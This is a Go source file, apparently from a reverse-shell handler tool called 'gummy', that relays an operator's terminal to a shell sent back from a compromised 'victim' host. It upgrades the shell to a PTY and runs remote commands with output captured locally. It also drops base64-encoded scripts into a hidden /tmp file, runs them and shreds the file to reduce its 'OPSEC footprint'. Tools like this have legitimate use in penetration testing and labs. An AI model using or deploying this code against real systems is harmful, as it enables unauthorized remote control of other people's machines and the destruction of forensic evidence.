package internal

import (
	"encoding/base64"
	"fmt"
	"io"
	"net"
	"os"
	"os/signal"
	"strings"
	"syscall"
	"time"

	"github.com/chsoares/gummy/internal/ui"
	"github.com/peterh/liner"
	"golang.org/x/term"
)

// Handler gerencia uma sessão de reverse shell
// A vítima já enviou uma shell conectada, nós fazemos relay do I/O
type Handler struct {
	conn         net.Conn     // Conexão com a vítima (que já tem shell rodando)
	sessionID    string       // ID da sessão para logs
	originalTerm *term.State  // Estado original do terminal para restaurar
	onClose      func(string) // Callback quando conexão fechar
	platform     string       // Platform detected ("windows", "linux", "unknown")
}

// NewHandler cria um novo handler para reverse shell
// Diferente do anterior: não executamos comandos localmente,
// fazemos relay entre usuário local e shell remota da vítima
func NewHandler(conn net.Conn, sessionID string) *Handler {
	return &Handler{
		conn:         conn,
		sessionID:    sessionID,
		originalTerm: nil,
		onClose:      nil,
	}
}

// SetCloseCallback define callback para quando conexão fechar
func (h *Handler) SetCloseCallback(callback func(string)) {
	h.onClose = callback
}

// SetPlatform define a plataforma detectada (chamado antes de Start())
func (h *Handler) SetPlatform(platform string) {
	h.platform = platform
}

// Start inicia o relay interativo entre usuário local e shell remota
// Esta é a função principal que conecta stdin/stdout local com a conexão remota
func (h *Handler) Start() error {
	// NÃO configuramos raw mode aqui!
	// Raw mode só é usado APÓS upgrade PTY bem-sucedido (como o Penelope faz)
	// Windows PowerShell e shells básicas usam input normal (line-buffered)

	// Configura handler para Ctrl+C
	h.setupSignalHandler()

	// Testa se a conexão está realmente viva
	if !h.isConnectionAlive() {
		return fmt.Errorf("connection is dead")
	}

	// Configura timeout para detectar shells inativas
	h.conn.SetReadDeadline(time.Now().Add(2 * time.Second))

	// Tenta detectar se é uma shell interativa lendo banner/prompt inicial
	initialBuffer := make([]byte, 4096)
	n, err := h.conn.Read(initialBuffer)
	if err != nil {
		if netErr, ok := err.(net.Error); ok && netErr.Timeout() {
			// Timeout normal para nc -e - não mostra nada
		} else {
			return fmt.Errorf("failed to read from remote shell: %w", err)
		}
	} else {
		// Mostra output inicial da vítima (prompt, banner, etc.)
		os.Stdout.Write(initialBuffer[:n])
	}

	// Remove timeout após conectar
	h.conn.SetReadDeadline(time.Time{})

	// Tenta upgrade PTY apenas se não for Windows
	// Se bem-sucedido, ativa raw mode (como o Penelope faz)
	ptySuccess := false
	if h.platform != "windows" {
		ptySuccess = h.attemptPTYUpgrade()
	}

	// Se PTY upgrade funcionou, ativa raw mode
	if ptySuccess {
		if err := h.setupRawMode(); err != nil {
			fmt.Printf("Warning: failed to setup raw mode after PTY: %v\n", err)
		} else {
			defer h.restoreTerminal()
		}
	}

	// Não precisa de drain adicional - detectSessionInfo() já rodou antes de Start()
	// e consumiu todo o output de detecção

	// Inicia goroutines para relay bidirecional de I/O
	errorChan := make(chan error, 2)

	// Se temos PTY (raw mode), usa relay normal
	// Se não temos PTY, usa readline loop (line-buffered)
	if ptySuccess {
		// Modo PTY: raw input, relay direto
		go h.relayLocalToRemote(errorChan)
	} else {
		// Modo readline: line-buffered input, Ctrl-D para sair
		fmt.Println("(readline mode: Ctrl-D to exit, Ctrl-C sends ^C to remote)")
		go h.readlineLoop(errorChan)
	}

	// Goroutine 2: Remote connection → Local stdout (output da vítima → nós)
	go h.relayRemoteToLocal(errorChan)

	// Aguarda até uma das goroutines terminar (erro ou EOF)
	err = <-errorChan

	// Notifica que conexão fechou se callback foi definido
	if h.onClose != nil && err != nil && err != io.EOF {
		h.onClose(h.sessionID)
	}

	return err
}

// readlineLoop lê input linha por linha (para shells não-PTY como PowerShell)
// Usa liner para edição de linha com suporte a setas
func (h *Handler) readlineLoop(errorChan chan error) {
	// Cria instância liner
	line := liner.NewLiner()
	defer line.Close()

	// Configura comportamento
	line.SetCtrlCAborts(false) // Ctrl-C não aborta (gera erro especial)
	line.SetMultiLineMode(false)
	line.SetBeep(false) // Sem beep em erros

	// Carrega histórico se existir (da sessão do menu principal)
	historyPath := os.ExpandEnv("$HOME/.gummy/shell_history")
	if f, err := os.Open(historyPath); err == nil {
		line.ReadHistory(f)
		f.Close()
	}

	// Channel para capturar Ctrl-C
	sigChan := make(chan os.Signal, 1)
	signal.Notify(sigChan, syscall.SIGINT)
	defer signal.Stop(sigChan)

	// Goroutine para processar Ctrl-C
	ctrlCPressed := make(chan struct{}, 1)
	go func() {
		for range sigChan {
			// Notifica que Ctrl-C foi pressionado
			select {
			case ctrlCPressed <- struct{}{}:
			default:
			}
		}
	}()

	for {
		// Tenta ler linha
		input, err := line.Prompt("")

		// Verifica se Ctrl-C foi pressionado
		select {
		case <-ctrlCPressed:
			// Envia ^C para shell remota
			h.conn.Write([]byte{0x03})
			fmt.Println("^C")
			continue
		default:
		}

		if err != nil {
			if err == liner.ErrPromptAborted {
				// Ctrl-C durante o prompt
				h.conn.Write([]byte{0x03})
				fmt.Println("^C")
				continue
			}

			if err == io.EOF {
				// Ctrl-D - sair
				fmt.Print(ui.ReturningToMenu())
				errorChan <- io.EOF
				return
			}

			// Erro real
			errorChan <- fmt.Errorf("liner error: %w", err)
			return
		}

		// Adiciona ao histórico local
		line.AppendHistory(input)

		// Envia linha completa
		_, writeErr := h.conn.Write([]byte(input + "\n"))
		if writeErr != nil {
			errorChan <- fmt.Errorf("write to remote error: %w", writeErr)
			return
		}
	}

	// Salva histórico ao sair
	if f, err := os.Create(historyPath); err == nil {
		line.WriteHistory(f)
		f.Close()
	}
}

// relayLocalToRemote lê do stdin local e envia para a shell remota (modo raw/PTY)
// Usuário digita comando → enviado para vítima
func (h *Handler) relayLocalToRemote(errorChan chan error) {
	buffer := make([]byte, 4096)

	for {
		n, err := os.Stdin.Read(buffer)
		if err != nil {
			errorChan <- fmt.Errorf("local to remote relay error: %w", err)
			return
		}

		data := buffer[:n]

		// Intercepta F12 (\x1b[24~) para voltar ao menu
		if h.containsF12(data) {
			fmt.Print(ui.ReturningToMenu())
			errorChan <- io.EOF
			return
		}

		// Envia dados normalmente para shell remota
		_, writeErr := h.conn.Write(data)
		if writeErr != nil {
			errorChan <- fmt.Errorf("write to remote error: %w", writeErr)
			return
		}
	}
}

// containsF12 verifica se os dados contém a sequência F12
func (h *Handler) containsF12(data []byte) bool {
	f12Sequence := []byte{0x1b, '[', '2', '4', '~'} // ESC[24~

	// Busca pela sequência F12 nos dados
	for i := 0; i <= len(data)-len(f12Sequence); i++ {
		if i+len(f12Sequence) <= len(data) {
			match := true
			for j := 0; j < len(f12Sequence); j++ {
				if data[i+j] != f12Sequence[j] {
					match = false
					break
				}
			}
			if match {
				return true
			}
		}
	}

	return false
}

// relayRemoteToLocal lê da shell remota e mostra no stdout local
// Output da vítima → mostrado para usuário
func (h *Handler) relayRemoteToLocal(errorChan chan error) {
	// Para melhorar output de raw shells, vamos processar byte a byte
	// e fazer algumas normalizações básicas
	buffer := make([]byte, 4096)
	for {
		n, err := h.conn.Read(buffer)
		if err != nil {
			if err == io.EOF {
				errorChan <- io.EOF
			} else {
				errorChan <- fmt.Errorf("remote to local relay error: %w", err)
			}
			return
		}

		// Normaliza alguns caracteres problemáticos de raw shells
		output := h.normalizeOutput(buffer[:n])

		_, writeErr := os.Stdout.Write(output)
		if writeErr != nil {
			errorChan <- fmt.Errorf("write to stdout error: %w", writeErr)
			return
		}
	}
}

// normalizeOutput aplica normalizações básicas para melhorar output de raw shells
func (h *Handler) normalizeOutput(data []byte) []byte {
	// Para raw shells básicas, não fazemos muita normalização
	// porque pode quebrar aplicações que dependem de sequências específicas

	// Por enquanto, retorna dados como estão
	// Em futuras versões, podemos adicionar:
	// - Conversão \r\n para \n em algumas situações
	// - Limpeza de sequências de controle malformadas
	// - Etc.

	return data
}

// attemptPTYUpgrade tenta fazer upgrade da shell para PTY
// Retorna true se bem-sucedido
func (h *Handler) attemptPTYUpgrade() bool {
	upgrader := NewPTYUpgrader(h.conn, h.sessionID)

	err := upgrader.TryUpgrade()
	if err == nil {
		// PTY upgrade bem-sucedido - drenar output de setup
		h.drainSetupOutput()
		return true
	}
	// Falhou ou não foi possível fazer upgrade
	return false
}

// drainSetupOutput drena output dos comandos de setup do PTY
func (h *Handler) drainSetupOutput() {
	// Aguarda um pouco para comandos terminarem
	time.Sleep(500 * time.Millisecond)

	// Drena qualquer output residual dos comandos de setup
	buffer := make([]byte, 4096)
	h.conn.SetReadDeadline(time.Now().Add(200 * time.Millisecond))

	for {
		_, err := h.conn.Read(buffer)
		if err != nil {
			break // Timeout ou fim dos dados
		}
	}

	h.conn.SetReadDeadline(time.Time{})
}

// drainBeforeInteractive drena qualquer comando residual antes da shell interativa
func (h *Handler) drainBeforeInteractive() {
	// Pausa para dar tempo para detecção de whoami terminar (em background)
	time.Sleep(1200 * time.Millisecond)

	// Drena tudo que estiver disponível IMEDIATAMENTE (não esperamos mais)
	buffer := make([]byte, 8192)
	allOutput := ""

	// Lê tudo disponível rapidamente
	h.conn.SetReadDeadline(time.Now().Add(300 * time.Millisecond))
	for {
		n, err := h.conn.Read(buffer)
		if err != nil || n == 0 {
			break
		}
		allOutput += string(buffer[:n])
	}
	h.conn.SetReadDeadline(time.Time{})

	// Se tem output, procura pelo último prompt
	if len(allOutput) > 0 {
		lines := strings.Split(allOutput, "\n")
		for i := len(lines) - 1; i >= 0; i-- {
			line := strings.TrimSpace(lines[i])
			// PowerShell prompt: "PS C:\...\...> "
			// Bash prompt: ends with $ or #
			if strings.HasPrefix(line, "PS ") && strings.HasSuffix(line, "> ") {
				os.Stdout.Write([]byte(line + "\n"))
				return
			} else if strings.HasSuffix(line, "$") || strings.HasSuffix(line, "#") || strings.HasSuffix(line, ">") {
				os.Stdout.Write([]byte(line + "\n"))
				return
			}
		}
	}
}

// isConnectionAlive testa se a conexão está realmente viva
func (h *Handler) isConnectionAlive() bool {
	// Tenta escrever um byte nulo (não visível) para testar a conexão
	h.conn.SetWriteDeadline(time.Now().Add(1 * time.Second))
	_, err := h.conn.Write([]byte{})
	h.conn.SetWriteDeadline(time.Time{})

	if err != nil {
		return false
	}

	// Testa leitura com timeout muito curto
	h.conn.SetReadDeadline(time.Now().Add(100 * time.Millisecond))
	buffer := make([]byte, 1)
	_, err = h.conn.Read(buffer)
	h.conn.SetReadDeadline(time.Time{})

	// Se deu timeout, conexão está viva mas sem dados (normal)
	// Se deu EOF ou outro erro de conexão, está morta
	if err != nil {
		if netErr, ok := err.(net.Error); ok && netErr.Timeout() {
			return true // Timeout é normal, conexão viva
		}
		return false // EOF ou erro real
	}

	return true
}

// GetSessionID retorna o ID da sessão
func (h *Handler) GetSessionID() string {
	return h.sessionID
}

// SendCommand envia um comando para a shell remota (útil para automação futura)
func (h *Handler) SendCommand(command string) error {
	_, err := h.conn.Write([]byte(command + "\n"))
	if err != nil {
		return fmt.Errorf("failed to send command: %w", err)
	}
	return nil
}

// setupRawMode coloca o terminal local em modo raw
// Isso desabilita echo local e permite controle total da shell remota
func (h *Handler) setupRawMode() error {
	// Verifica se stdin é um terminal
	if !term.IsTerminal(int(os.Stdin.Fd())) {
		return fmt.Errorf("stdin is not a terminal")
	}

	// Salva estado original do terminal
	originalState, err := term.GetState(int(os.Stdin.Fd()))
	if err != nil {
		return fmt.Errorf("failed to get terminal state: %w", err)
	}
	h.originalTerm = originalState

	// Coloca terminal em modo raw
	// Raw mode: sem echo, sem buffering, caracteres passam direto
	_, err = term.MakeRaw(int(os.Stdin.Fd()))
	if err != nil {
		return fmt.Errorf("failed to set raw mode: %w", err)
	}

	return nil
}

// restoreTerminal restaura o terminal ao estado original
func (h *Handler) restoreTerminal() {
	if h.originalTerm != nil {
		term.Restore(int(os.Stdin.Fd()), h.originalTerm)
	}
}

// setupSignalHandler configura handler para restaurar terminal em caso de Ctrl+C
func (h *Handler) setupSignalHandler() {
	sigChan := make(chan os.Signal, 1)
	signal.Notify(sigChan, syscall.SIGINT, syscall.SIGTERM)

	go func() {
		<-sigChan
		h.restoreTerminal()
		fmt.Printf("\n")
		os.Exit(0)
	}()
}

// ExecuteCommand executes a command on the remote shell and returns output
// This is used for file transfer and other background operations
// It doesn't interfere with interactive shell mode
func (h *Handler) ExecuteCommand(cmd string) (string, error) {
	// Send command
	_, err := h.conn.Write([]byte(cmd + "\n"))
	if err != nil {
		return "", fmt.Errorf("failed to send command: %w", err)
	}

	// Wait for command to execute
	time.Sleep(200 * time.Millisecond)

	// Read output with timeout
	var output strings.Builder
	buffer := make([]byte, 8192)
	h.conn.SetReadDeadline(time.Now().Add(3 * time.Second))

	for {
		n, err := h.conn.Read(buffer)
		if err != nil {
			break // Timeout or EOF
		}

		if n > 0 {
			output.Write(buffer[:n])
		}

		// If we got less than buffer size, might be done
		if n < len(buffer) {
			time.Sleep(100 * time.Millisecond)
			// Try one more small read
			h.conn.SetReadDeadline(time.Now().Add(200 * time.Millisecond))
			n, err := h.conn.Read(buffer)
			if err == nil && n > 0 {
				output.Write(buffer[:n])
			}
			break
		}
	}

	h.conn.SetReadDeadline(time.Time{})
	return output.String(), nil
}

// ExecuteWithStreaming executes a command remotely and streams output to local file
// This captures output directly from the connection in real-time (like Penelope does)
func (h *Handler) ExecuteWithStreaming(cmd, localOutputPath string) error {
	// Create local output file
	localFile, err := os.Create(localOutputPath)
	if err != nil {
		return fmt.Errorf("failed to create local file: %w", err)
	}
	defer localFile.Close()

	// Send command with a unique marker at the end
	marker := fmt.Sprintf("__GUMMY_DONE_%d__", time.Now().UnixNano())
	fullCmd := fmt.Sprintf("%s\necho '%s'\n", cmd, marker)

	_, err = h.conn.Write([]byte(fullCmd))
	if err != nil {
		return fmt.Errorf("failed to send command: %w", err)
	}

	// Read output in real-time until we see the marker
	buffer := make([]byte, 4096)
	var accumulated strings.Builder
	h.conn.SetReadDeadline(time.Now().Add(10 * time.Minute)) // Max 10 minutes for script

	for {
		n, err := h.conn.Read(buffer)
		if err != nil {
			if err == io.EOF {
				break
			}
			// Check if it's just a timeout but we already got the marker
			if strings.Contains(accumulated.String(), marker) {
				break
			}
			return fmt.Errorf("read error: %w", err)
		}

		if n > 0 {
			chunk := string(buffer[:n])
			accumulated.WriteString(chunk)

			// Write to local file immediately (real-time streaming)
			localFile.WriteString(chunk)
			localFile.Sync()

			// Check if we've received the completion marker
			if strings.Contains(accumulated.String(), marker) {
				// Remove deadline immediately to avoid timeout errors
				h.conn.SetReadDeadline(time.Time{})
				break
			}
		}
	}

	// Ensure deadline is cleared
	h.conn.SetReadDeadline(time.Time{})

	// Clean the output file from shell noise
	finalContent := accumulated.String()

	// Find where marker appears
	markerIndex := strings.Index(finalContent, marker)
	if markerIndex != -1 {
		finalContent = finalContent[:markerIndex]
	}

	// Don't rewrite the file - leave raw output intact
	// This prevents tail -f from showing duplicate content when file is truncated
	// User can see raw output in real-time via tail -f in separate terminal
	// If they want clean output later, they can manually clean it or use cat

	return nil
}

// ExecuteScriptFromStdin executes script with minimal OPSEC footprint
// Uses /tmp/ briefly (file exists for ~seconds), but gives clean output
func (h *Handler) ExecuteScriptFromStdin(interpreter, args string, scriptData []byte, localOutputPath string) error {
	// Create local output file
	localFile, err := os.Create(localOutputPath)
	if err != nil {
		return fmt.Errorf("failed to create local file: %w", err)
	}
	defer localFile.Close()

	// Use /tmp/ with hidden filename
	tempFile := fmt.Sprintf("/tmp/.gummy_%d", time.Now().UnixNano())
	doneMarker := fmt.Sprintf("__GUMMY_DONE_%d__", time.Now().UnixNano())

	// Base64 encode to avoid any escaping issues
	scriptB64 := base64.StdEncoding.EncodeToString(scriptData)

	// Single line: decode to temp, execute, shred/delete
	// This is clean, works reliably, and file exists briefly
	fullCmd := fmt.Sprintf("echo %s|base64 -d>%s;%s %s%s;shred -uz %s 2>/dev/null||rm -f %s;echo %s\n",
		scriptB64, tempFile, interpreter, tempFile, args, tempFile, tempFile, doneMarker)

	_, err = h.conn.Write([]byte(fullCmd))
	if err != nil {
		return fmt.Errorf("failed to send command: %w", err)
	}

	// Read output in real-time until done marker
	buffer := make([]byte, 4096)
	var accumulated strings.Builder
	h.conn.SetReadDeadline(time.Now().Add(5 * time.Minute))

	for {
		n, err := h.conn.Read(buffer)
		if err != nil {
			if err == io.EOF {
				break
			}
			if accumulated.Len() > 0 && strings.Contains(accumulated.String(), doneMarker) {
				break
			}
			return fmt.Errorf("read error: %w", err)
		}

		if n > 0 {
			chunk := string(buffer[:n])
			accumulated.WriteString(chunk)

			// Write to local file immediately
			localFile.WriteString(chunk)
			localFile.Sync()

			// Check for done marker
			if strings.Contains(accumulated.String(), doneMarker) {
				break
			}
		}
	}

	h.conn.SetReadDeadline(time.Time{})

	// Clean output (remove done marker and shell noise)
	finalContent := accumulated.String()

	// Remove done marker
	markerIndex := strings.Index(finalContent, doneMarker)
	if markerIndex != -1 {
		finalContent = finalContent[:markerIndex]
	}

	// Don't rewrite the file - leave raw output intact
	// This prevents tail -f from showing duplicate content when file is truncated
	// User can see raw output in real-time via tail -f in separate terminal
	// If they want clean output later, they can manually clean it or use cat

	return nil
}

// GetConnection returns the underlying connection
// Used for direct file transfer operations
func (h *Handler) GetConnection() net.Conn {
	return h.conn
}